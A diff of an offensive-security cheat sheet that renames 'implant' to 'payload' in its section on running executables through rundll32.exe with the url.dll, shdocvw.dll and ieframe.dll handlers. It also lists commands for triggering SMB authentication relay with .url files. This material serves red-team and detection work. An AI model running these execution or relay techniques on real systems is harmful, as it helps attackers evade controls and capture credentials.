@@ -17,7 +17,7 @@ C:\Windows\System32\cmd.exe
 C:\Windows\SysWOW64\cmd.exe
 ```
 
-## 02 - Execute Implants
+## 02 - Execute Payloads
 
 > [!INFO] [Character Maximum Limit](https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation)
 > The maximum length of characters in a string is 8192 characters when executing through a command prompt.
@@ -25,31 +25,31 @@ C:\Windows\SysWOW64\cmd.exe
 Execute commands.
 
 ```
-C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.exe"
+C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.exe"
 
-C:\> rundll32.exe url.dll,OpenURL "file://<drive_letter>:/absolute/path/to/implant.exe"
+C:\> rundll32.exe url.dll,OpenURL "file://<drive_letter>:/absolute/path/to/payload.exe"
 
-C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\implant.exe"
+C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\payload.exe"
 
-C:\> rundll32.exe url.dll,FileProtocolHandler "file:////<drive_letter>:/absolute/path/to/implant.exe"
+C:\> rundll32.exe url.dll,FileProtocolHandler "file:////<drive_letter>:/absolute/path/to/payload.exe"
 
-C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.exe"
+C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\payload.exe"
 
-C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.exe"
+C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.exe"
 
-C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.exe"
+C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.exe"
 ```
 
 Execute command to perform SMB authentication relay.
 
 ```
-C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.url"
+C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.url"
 
-C:\> rundll32.exe url.dll,OpenURL "file://<drive_letter>:/absolute/path/to/implant.url"
+C:\> rundll32.exe url.dll,OpenURL "file://<drive_letter>:/absolute/path/to/payload.url"
 
-C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.url"
+C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\payload.url"
 
-C:\> rundll32.exe url.dll,OpenURLA "file://<drive_letter>:/absolute/path/to/implant.url"
+C:\> rundll32.exe url.dll,OpenURLA "file://<drive_letter>:/absolute/path/to/payload.url"
 ```
 
 ---
